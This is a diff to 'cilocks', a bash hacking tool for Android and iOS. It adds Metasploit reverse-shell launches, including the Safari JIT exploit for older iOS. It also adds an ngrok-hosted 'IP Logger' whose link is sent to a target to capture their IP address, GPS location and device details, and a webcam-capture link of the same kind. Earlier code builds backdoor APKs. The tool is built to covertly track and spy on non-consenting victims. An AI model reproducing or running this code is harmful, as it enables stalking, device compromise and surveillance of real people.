@@ -1,21 +1,24 @@
 #!/usr/bin/env bash
-m="\e[0;31m" # merah
-k="\e[0;33m" # kuning
-h="\e[0;32m" # hijau
-b="\e[0;34m" # biru
-lm="\e[1;31m" # merah terang
-lk="\e[1;33m" # kuning terang
-lh="\e[1;32m" # hijau terang
-lb="\e[1;34m" # langit biru
-n="\e[0m" # netral
-w="\e[1;37m" # putih tebal
+
+##############################color
+m="\e[0;31m"      # merah           # red
+k="\e[0;33m"      # kuning          # yellow
+h="\e[0;32m"      # hijau           # green
+b="\e[0;34m"      # biru            # blue
+lm="\e[1;31m"     # merah terang    # pink
+lk="\e[1;33m"     # kuning terang   # bright yellow
+lh="\e[1;32m"     # hijau terang    # light green
+lb="\e[1;34m"     # langit biru     # blue sky
+n="\e[0m"         # netral          # neutral
+w="\e[1;37m"      # putih tebal     #thick white
 
 
+###############################give Permissons,if not root user exit
 clear
 [[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "You must be root to run the script${n}"; echo ; exit 1; }
 path=$(pwd)
 name='cilocks'
-version="v1.2"
+version="v2.1"
 function files() {
   file=$path/$name
   bash $file
@@ -30,6 +33,7 @@ echo -e "${lb}
 \____/_/_____/\____/\___/_/|_/____/$version
 ${n}"
 echo -e "${m}   Crack Interface LockScreen${n}"
+echo -e "${m}       Android/IOS Hacking${n}"
 echo -e "${lb}      LoliC0d3 - Tegal1337${n}"
 }
 
@@ -87,11 +91,13 @@ clear
   10.Jump To Metasploit
   11.Control Android {Scrcpy}
   12.Phone Info
+  13.IP Logger {Over Internet}
+  14.Get WebCam {Over Internet}
   99.Exit
   ${n}"
   read -p "senpai@tegalsec:~# " select
 if [[ $select == 1 ]]; then
-  #remove old version
+  # remove old version
   rm -f "${path}/cilocks" >/dev/null 2>&1
   rm -f "${path}/data/config" >/dev/null 2>&1
   rm -f "${path}/data/os" >/dev/null 2>&1
@@ -382,12 +388,15 @@ elif [[ $select == 3 ]]; then
   clear
   mmeta
   payload='android/meterpreter/reverse_tcp'
-  echo -e "${m}
-Payload => $payload ${n}${lh}
-Listener
-1.exploit/multi/handler {Default}
-2.post/android/manage/remove_lock
-3.post/android/manage/remove_lock_root
+  payload2='osx/armle/execute/reverse_tcp'
+  echo -e "${lh}
+  Payload {Android}${n} =>${m} $payload ${n}${lh}
+  Payload (iOS) ${n}=>${m} $payload2 ${n}${lh}
+  Listener
+  1.Multi Handler {Default}
+  2.Remove Lock
+  3.Remove Lock {Root}
+  4.Safari Jit {iOS < 7.1.2}
   ${n}"
   read -p "senpai@tegalsec:~# " select
   if [[ $select == 1 ]]; then
@@ -411,8 +420,15 @@ Listener
     exploit='use post/android/manage/remove_lock_root'
     xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
 
-  fi
   elif [[ $select == 4 ]]; then
+    read -p "LHOST: " host
+    read -p "LPORT: " port
+    msfconsole=msfconsole
+    exploit='use exploit/apple_ios/browser/safari_jit'
+    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload2 ; set lhost $host ; set lport $port; exploit; exit -y'"
+  fi
+
+elif [[ $select == 4 ]]; then
   path="backdoor"
   loli="loli.apk"
   read -p "Enter LHOST: " host
@@ -435,9 +451,10 @@ Listener
   rm $paths
   # rm $path/key.keystore
   echo "Your Backdoor Created In" $milf
-elif [[ $select == 99 ]]; then
-files
-fi
+  elif [[ $select == 99 ]]; then
+  files
+  fi
+
 
 elif [[ $select == 11 ]]; then
   scrcpy
@@ -468,6 +485,466 @@ elif [[ $select == 12 ]]; then
   # elif [[ $select == 99 ]]; then
   #   files
   # fi
+
+elif [[ $select == 13 ]]; then
+
+# path= "info"
+
+  clear
+  function logger() {
+    banner
+    echo -e "${m}   IP Logger {Over Internet}${n}"
+  }
+  logger
+
+  menu() {
+  trap 'echo -e "\n";stop;exit 1' 2
+
+
+  dependencies() {
+
+  command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+
+
+
+  command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+
+  }
+
+
+  stop() {
+
+  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+  checkphp=$(ps aux | grep -o "php" | head -n1)
+  checkssh=$(ps aux | grep -o "ssh" | head -n1)
+  if [[ $checkngrok == *'ngrok'* ]]; then
+  pkill -f -2 ngrok > /dev/null 2>&1
+  killall -2 ngrok > /dev/null 2>&1
+  fi
+  if [[ $checkphp == *'php'* ]]; then
+  pkill -f -2 php > /dev/null 2>&1
+  killall -2 php > /dev/null 2>&1
+  fi
+  if [[ $checkssh == *'ssh'* ]]; then
+  pkill -f -2 ssh > /dev/null 2>&1
+  killall ssh > /dev/null 2>&1
+  fi
+  if [[ -e sendlink ]]; then
+  rm -rf sendlink
+  fi
+
+  }
+
+  catch_cred() {
+
+  longitude=$(grep -o 'Longitude:.*' info/geolocate.txt | cut -d " " -f2 | tr -d ' ')
+  IFS=$'\n'
+  latitude=$(grep -o 'Latitude:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  altitude=$(grep -o 'Altitude:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  accuracy=$(grep -o 'Accuracy:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  hardware=$(grep -o 'Cores:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  speed=$(grep -o 'Speed:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  platform=$(grep -o 'Platform:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  heading=$(grep -o 'Heading:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  memory=$(grep -o 'Memory:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  useragent=$(grep -o 'User-Agent:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  height=$(grep -o 'Screen Height:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  width=$(grep -o 'Screen Width:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
+  # echo -e "${lh} Geolocation:"
+  echo -e "${lh} Latitude:${n}" $latitude
+  echo -e "${lh} Longitude:${n}" $longitude
+  echo -e "${lh} Altitude:${n}" $altitude
+  echo -e "${lh} Speed:${n}" $speed
+  echo -e "${lh} Heading:${n}" $heading
+  echo -e "${lh} Accuracy:n${n}" $accuracy
+  echo -e "${lh} Map:${n} https://www.google.com/maps/place/"$latitude"+"$longitude
+  echo -e "${lh} Device Info:${n}"
+  echo -e "${lh} Platform:${n}" $platform
+  echo -e "${lh} Cores:${n}" $hardware
+  echo -e "${lh} User-Agent:${n}" $useragent
+  echo -e "${lh} Memory:${n}" $memory
+  echo -e "${lh} Resolution:${n}" $height"x"$width
+  cat info/geolocate.txt >> info/saved.geolocate.txt
+  echo -e "${k} Saved: info/saved.geolocate.txt"
+  killall -2 php > /dev/null 2>&1
+  killall -2 ngrok > /dev/null 2>&1
+  killall ssh > /dev/null 2>&1
+  if [[ -e sendlink ]]; then
+  rm -rf sendlink
+  fi
+  exit 1
+
+  }
+
+  getcredentials() {
+  echo -e "${lh} Waiting Geolocation ...${n}"
+  while [ true ]; do
+
+
+  if [[ -e "info/geolocate.txt" ]]; then
+  echo -e "${m}[*] Geolocation Found!${n}"
+  catch_cred
+
+  fi
+  sleep 0.5
+  if [[ -e "info/error.txt" ]]; then
+  echo -e "\n${m}[*] Error on Geolocation!${n}"
+  checkerror=$(grep -o 'Error:.*' info/error.txt | cut -d " " -f2 | tr -d ' ' )
+  if [[ $checkerror == 1 ]]; then
+  echo -e "${m} User Denied Geolocation ...${n}"
+
+  rm -rf info/error.txt
+  getcredentials
+  elif [[ $checkerror == 2 ]]; then
+  echo -e "${m} Geolocation Unavailable ...${n}"
+
+  rm -rf info/error.txt
+  getcredentials
+  elif [[ $checkerror == 3 ]]; then
+  echo -e "${m} Time Out ...${n}"
+
+  rm -rf info/error.txt
+  getcredentials
+  elif [[ $checkerror == 4 ]]; then
+  echo -e "${m} Unknow Error ...${n}"
+
+  rm -rf info/error.txt
+  getcredentials
+  else
+  echo -e "${m} Error reading file error.txt...${n}"
+  exit 1
+  fi
+  fi
+  sleep 0.5
+
+
+
+  done
+
+
+  }
+
+  catch_ip() {
+  touch info/saved.geolocate.txt
+  ip=$(grep -a 'IP:' info/ip.txt | cut -d " " -f2 | tr -d '\r')
+  IFS=$'\n'
+  ua=$(grep 'User-Agent:' info/ip.txt | cut -d '"' -f2)
+  echo -e "${lh} Target IP:${n}" $ip
+  echo -e "${lh} User-Agent:${n}" $ua
+  echo -e "${k} Saved:info/saved.ip.txt${n}"
+  cat info/ip.txt >> info/saved.ip.txt
+
+
+  if [[ -e iptracker.log ]]; then
+  rm -rf iptracker.log
+  fi
+
+  IFS='\n'
+  iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+  IFS=$'\n'
+  continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
+  echo -e "\n"
+  hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
+  if [[ $hostnameip != "" ]]; then
+  echo -e "${lh}[*] Hostname:${n}" $hostnameip
+  fi
+
+
+  reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
+  if [[ $reverse_dns != "" ]]; then
+  echo -e "${lh}[*] Reverse DNS:${n}" $reverse_dns
+  fi
+
+
+
+  if [[ $continent != "" ]]; then
+  echo -e "${lh}[*] IP Continent:${n}" $continent
+  fi
+
+
+  country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+  if [[ $country != "" ]]; then
+  echo -e "${lh}[*] IP Country:${n}" $country
+  fi
+
+
+  state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+  if [[ $state != "" ]]; then
+  echo -e "${lh}[*] State:${n}" $state
+  fi
+
+  city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+  if [[ $city != "" ]]; then
+  echo -e "${lh}[*] City Location:${n}" $city
+  fi
+
+
+  isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+  if [[ $isp != "" ]]; then
+  echo -e "${lh}[*] ISP:${n}" $isp
+  fi
+
+
+  as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+  if [[ $as_number != "" ]]; then
+  echo -e "${lh}[*] AS Number:${n}" $as_number
+  fi
+
+
+  ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+  if [[ $ip_speed != "" ]]; then
+  echo -e "${lh}[*] IP Address Speed:${n}" $ip_speed
+  fi
+
+  ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+  if [[ $ip_currency != "" ]]; then
+  echo -e "${lh}[*] IP Currency:"${n} $ip_currency
+  fi
+
+  echo -e "\n"
+  rm -rf iptracker.log
+
+  getcredentials
+  }
+
+  start() {
+  if [[ -e info/ip.txt ]]; then
+  rm -rf info/ip.txt
+
+  fi
+  if [[ -e info/geolocate.txt ]]; then
+  rm -rf info/geolocate.txt
+
+  fi
+
+  if [[ -e info/error.txt ]]; then
+  rm -rf info/error.txt
+
+  fi
+  if [[ -e ngrok ]]; then
+  echo ""
+  else
+
+  echo -e "${k}[*] Downloading Ngrok...${n}\n"
+  arch=$(uname -a | grep -o 'arm' | head -n1)
+  arch2=$(uname -a | grep -o 'Android' | head -n1)
+  if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+  command -v wget > /dev/null 2>&1 || { echo >&2 "${m}Cilocks require wget but it's not installed. Install it. Aborting.${n}"; exit 1; }
+  wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+  if [[ -e ngrok-stable-linux-arm.zip ]]; then
+  unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+  chmod +x ngrok
+  rm -rf ngrok-stable-linux-arm.zip
+  else
+  echo -e "${m}[!] Download error... Termux?Nethunter?, run: pkg install wget${n}"
+  exit 1
+  fi
+
+
+
+  else
+  wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
+  if [[ -e ngrok-stable-linux-386.zip ]]; then
+  command -v unzip > /dev/null 2>&1 || { echo >&2 "${m}Cilocks require unzip but it's not installed. Install it. Aborting.${n}"; exit 1; }
+  unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+  chmod +x ngrok
+  rm -rf ngrok-stable-linux-386.zip
+  else
+  echo -e "${m}[!] Download error... ${n}"
+  exit 1
+  fi
+  fi
+  fi
+
+  echo -e "${lh}[*] Starting php server...${n}"
+  php -t "info/" -S 127.0.0.1:3333 > /dev/null 2>&1 &
+  sleep 2
+  echo -e "${lh}[*] Starting ngrok server...${n}"
+  ./ngrok http 3333 > /dev/null 2>&1 &
+  sleep 10
+
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+  echo -e "${lb}[*] Send this link to the Target:${n}" $link
+  checkfound
+  }
+
+  loli(){
+    start
+  }
+  checkfound() {
+
+  echo -e "\n"
+  echo -e "${lh} Waiting target open the link, ${n}Press Ctrl + C to exit..."
+  while [ true ]; do
+
+
+  if [[ -e "info/ip.txt" ]]; then
+  echo -e "${m} IP Found!${n}"
+  catch_ip
+
+  fi
+  sleep 1
+  done
+
+
+  }
+  dependencies
+  loli
+  menu
+
+  }
+  menu
+
+
+elif [[ $select == 14 ]]; then
+
+  clear
+  function cam() {
+    banner
+    echo -e "${m}   Get WebCam {Over Internet}${n}"
+  }
+  cam
+
+  stop() {
+
+  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+  checkphp=$(ps aux | grep -o "php" | head -n1)
+  checkssh=$(ps aux | grep -o "ssh" | head -n1)
+  if [[ $checkngrok == *'ngrok'* ]]; then
+  pkill -f -2 ngrok > /dev/null 2>&1
+  killall -2 ngrok > /dev/null 2>&1
+  fi
+
+  if [[ $checkphp == *'php'* ]]; then
+  killall -2 php > /dev/null 2>&1
+  fi
+  if [[ $checkssh == *'ssh'* ]]; then
+  killall -2 ssh > /dev/null 2>&1
+  fi
+  exit 1
+
+  }
+
+  dependencies() {
+
+
+  command -v php > /dev/null 2>&1 || { echo >&2 "${lh}Cilocks require php but it's not installed. Install it. Aborting.${n}"; exit 1; }
+
+
+
+  }
+
+  catch_ip() {
+
+  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+  IFS=$'\n'
+  echo -e "${m}IP:${n}" $ip
+
+  cat ip.txt >> saved.ip.txt
+
+
+  }
+
+  checkfound() {
+
+  echo -e "\n"
+  echo -e "${lh} Waiting targets,${n} Press Ctrl + C to exit..."
+  while [ true ]; do
+
+
+  if [[ -e "ip.txt" ]]; then
+  echo -e "${m} Target opened the link!${n}\n"
+  echo -e "${k} File saved as cam${n}"
+  catch_ip
+  rm -rf ip.txt
+
+  fi
+
+  sleep 0.5
+
+  if [[ -e "Log.log" ]]; then
+  echo -e "${lh} Cam file received!${n}"
+  rm -rf Log.log
+  fi
+  sleep 0.5
+
+  done
+
+  }
+
+  payload_ngrok() {
+
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+  sed 's+forwarding_link+'$link'+g' tmp.html > index2.html
+  sed 's+forwarding_link+'$link'+g' tmp.php > index.php
+
+
+  }
+
+  ngrok_server() {
+
+
+  if [[ -e ngrok ]]; then
+  echo ""
+  else
+  command -v unzip > /dev/null 2>&1 || { echo >&2 "${lh}Cilocks require unzip but it's not installed. Install it. Aborting.${lh}"; exit 1; }
+  command -v wget > /dev/null 2>&1 || { echo >&2 "${lh}Cilocks require wget but it's not installed. Install it. Aborting.${lh}"; exit 1; }
+  echo -e "${m} Downloading Ngrok...${n}\n"
+  arch=$(uname -a | grep -o 'arm' | head -n1)
+  arch2=$(uname -a | grep -o 'Android' | head -n1)
+  if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+  wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+  if [[ -e ngrok-stable-linux-arm.zip ]]; then
+  unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+  chmod +x ngrok
+  rm -rf ngrok-stable-linux-arm.zip
+  else
+  echo -e "${m}[!] Download error... Termux?Nethunter?, run: pkg install wget${n}"
+  exit 1
+  fi
+
+  else
+  wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
+  if [[ -e ngrok-stable-linux-386.zip ]]; then
+  unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+  chmod +x ngrok
+  rm -rf ngrok-stable-linux-386.zip
+  else
+  echo -e "${m}[!] Download error...${n} "
+  exit 1
+  fi
+  fi
+  fi
+
+  echo -e "${lh} [*] Starting php server...${n}"
+  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+  sleep 2
+  echo -e "${lh} [*] Starting ngrok server...${n}"
+  ./ngrok http 3333 > /dev/null 2>&1 &
+  sleep 10
+
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+  echo -e "${lb} [*] Send this link to the Target:${n}" $link
+
+  payload_ngrok
+  checkfound
+  }
+
+  loli() {
+  ngrok_server
+  sleep 1
+  clear
+  loli
+
+  }
+  dependencies
+  loli
+
+
 elif [[ $select == 99 ]]; then
     echo "oke"
 
